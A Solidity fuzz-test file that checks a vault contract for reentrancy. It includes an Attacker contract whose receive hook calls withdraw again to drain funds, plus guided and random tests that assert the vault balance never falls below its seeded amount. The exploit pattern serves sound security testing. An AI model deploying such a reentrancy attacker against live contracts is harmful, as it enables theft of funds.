// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/ReentrancyVault.sol";

contract Attacker {
    ReentrancyVault public vault;
    uint256 public attackCount;

    constructor(address payable _vault) {
        vault = ReentrancyVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value && attackCount < 5) {
            attackCount++;
            vault.withdraw();
        }
    }
}

contract ReentrancyFuzzTest {
    ReentrancyVault public vault;
    Attacker public attacker;

    function setUp() public {
        vault = new ReentrancyVault();
        attacker = new Attacker(payable(address(vault)));
        // Seed initial liquidity in vault
        (bool ok, ) = address(vault).call{value: 10 ether}("");
        if (!ok) {
            // deposit via normal flow
        }
    }

    // Guided Invariant Test: Targets reentrancy exploit sequence directly
    function testGuidedReentrancy(uint256 depositAmt) public {
        depositAmt = bound(depositAmt, 1 ether, 5 ether);
        uint256 initialVaultBal = 10 ether;

        // Ensure vault has initial liquidity
        if (address(vault).balance < initialVaultBal) {
            payable(address(vault)).transfer(initialVaultBal - address(vault).balance);
        }

        // Attacker attempts reentrancy
        attacker.attack{value: depositAmt}();

        // Invariant check: Vault balance should NEVER drain below honest accounting
        require(address(vault).balance >= initialVaultBal, "INVARIANT_VIOLATION: Vault drained via reentrancy");
    }

    // Random Fuzzing Test: Unguided uniform inputs with identical invariant oracle
    function testRandomReentrancy(uint256 randomVal, uint8 action) public {
        uint256 initialVaultBal = 10 ether;
        if (address(vault).balance < initialVaultBal) {
            payable(address(vault)).transfer(initialVaultBal - address(vault).balance);
        }

        if (action == 0 && randomVal > 0) {
            // random deposit and withdraw
            uint256 amt = bound(randomVal, 1, 5 ether);
            try vault.deposit{value: amt}() {
                try vault.withdraw() {} catch {}
            } catch {}
        } else if (action == 1) {
            try vault.withdraw() {} catch {}
        }

        // Identical Invariant check: Vault balance should NEVER drain below honest accounting
        require(address(vault).balance >= initialVaultBal, "INVARIANT_VIOLATION: Vault drained via reentrancy");
    }

    function bound(uint256 x, uint256 min, uint256 max) internal pure returns (uint256) {
        if (min >= max) return min;
        return min + (x % (max - min + 1));
    }

    receive() external payable {}
}
